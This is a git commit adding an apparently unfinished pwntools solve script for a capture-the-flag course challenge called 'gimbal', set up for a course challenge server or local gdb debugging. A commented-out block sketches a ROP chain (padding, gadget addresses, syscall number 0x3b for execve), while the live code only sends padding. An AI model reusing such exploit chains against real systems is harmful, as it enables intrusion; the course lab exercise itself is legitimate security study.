28ea8ed6c446233f44d4df0a132bf7eb2ba2a9e8
Preston Kemp <preston@prestonkemp.com>
2020-04-30 17:00:11 -0500

    gimbal

---
+++ solve_pwning_gimbal.py
@@ -0,0 +1,98 @@
+#import from py
+import re
+
+#outside imports
+from pwn import *
+
+#used for pulling the flag from output
+flag_regex = r"flag\{[^}]+\}"
+global_timeout = 5 #seconds
+
+#challenge-specific info
+host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
+port = 1343
+netid='pk1898'
+
+do_remote = False
+binary_name = './gimbal'
+
+#for doing local debugging
+is_local_dbg = True
+gdb_script = '''
+set pagination off
+set disassembly-flavor intel
+i proc mappings
+b *0x004006b6
+b *0x00400700
+b *0x00400705
+'''
+
+#universal flag finder, given a string
+def find_flag(input):
+    m = re.findall(flag_regex, input)
+    if(m != []):
+        return m[0]
+    else:
+        return None
+
+
+def solve(target):
+    # DATA = ''
+    # # DATA += 'A' * 2048
+    # # DATA += p64(0x00400621)
+    # # DATA += p64(0x00400621)
+    # # DATA += p64(0x00400621)
+    #
+    # # uncomment these
+    # DATA += ('AAAAAAAA')
+    # DATA += ('AAAAAAAA')
+    # DATA += ('AAAAAAAA')
+    # DATA += ('AAAAAAAA')
+    # DATA += ('AAAAAAAA')
+    #
+    # DATA += p64(0x00400646)  # first called after padding.
+    # DATA += p64(0x3b)
+    # DATA += p64(0x0040063e)
+    # DATA += p64(0x00)
+    # DATA += p64(0x00400636)
+    # DATA += p64(0x00)
+    # DATA += p64(0x0040062e)
+    # DATA += p64(0x00400708)
+    # DATA += p64(0x00400625)
+    # print
+    # target.read()
+    # print
+    # DATA
+    #
+
+    padding = 'A' * 50
+    print target.readline()
+    print target.sendline(padding)
+    print target.readline()
+    print target.sendline(padding)
+
+#universal target setup for remote-only
+def target():
+    if(do_remote):
+        r = remote(host, port)
+        r.sendline(netid)
+        r.recvline() # eat interstitial
+        return r
+    else:
+        if(is_local_dbg):
+            target = gdb.debug(binary_name, gdb_script)
+        else:
+            target = process(binary_name)
+        return target
+
+#scaffolding
+def main():
+    with target() as p:
+        flag = solve(p)
+    if(flag):
+        print "Challenge Solved: %s" % flag
+    else:
+        print "Challenge Not Solved"
+
+if __name__ == '__main__':
+    main()
